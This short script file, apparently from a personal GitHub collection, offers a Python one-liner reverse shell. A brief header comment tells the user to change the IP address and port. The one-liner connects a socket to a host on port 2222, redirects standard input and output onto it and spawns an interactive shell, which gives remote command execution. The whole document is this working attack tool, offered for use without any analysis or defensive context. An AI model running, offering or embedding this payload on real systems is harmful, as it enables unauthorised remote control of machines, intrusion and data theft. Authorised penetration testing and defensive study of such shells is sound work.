# XORPIOv PYTHON SHELL | A Reverse Shell in PYTHON.
# Copyright (C) 2024 XORPIOv / https://github.com/XORPIOv
#
# Description
# ------------
# This shell / script will allow you to make an outbound connection to local IP Address and port.
# Change IP Address && PORT to local IP && PORT.

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.22.8",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

